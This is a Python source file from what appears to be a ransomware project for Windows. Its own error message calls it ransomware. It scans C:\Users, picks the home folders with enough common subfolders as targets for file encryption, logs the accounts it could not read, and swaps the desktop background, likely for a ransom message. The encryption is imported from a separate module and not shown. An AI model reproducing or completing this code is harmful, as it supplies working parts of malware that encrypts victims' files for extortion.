from lib import aes
from lib import background
import json
import sys
import os


def get_score(path):
    """
    In a windows os some common folders are placed in the user home dir.
    This function detects how many common folders there are in the users home dir.
    """

    common_folders = ['Desktop', 'Downloads', 'Dropbox', 'Music', 'Documents', 'Videos', 'Links']
    
    score = 0

    for common_file in common_folders:
        if common_file in path:
            score += 1

    return score


def get_targeted_users(return_failed_users=False):
    """Returns the users home directory who's files are going to be encrypted."""

    failed_users = {}
    targeted_users = []

    for item in os.listdir('C:\\Users\\'):
        if os.path.isdir('C:\\Users\\' + item):
            try:  
                if get_score(os.listdir('C:\\Users\\' + item)) >= 3:
                    targeted_users.append(item)
            
            except Exception as err:
                failed_users[item] = {
                    'User': item,
                    'Error message': str(err),
                    'Brief message': err.args[-1],
                }

    if return_failed_users:
        return failed_users
    
    return targeted_users


def write_failed_users():
    """Writes the users that failed to logs/failed_users.json"""

    with open('logs/failed_users.json', 'w') as failed_users:
        json.dump(
            get_targeted_users(return_failed_users=True), 
            failed_users,
            indent=4,
            sort_keys=True,
        )


if __name__ == '__main__':
    if sys.platform != 'win32':
        sys.exit('ERROR: Ransomware only supports windows.')

    write_failed_users()

    # Change background.
    background.changeBG(background.get_background())
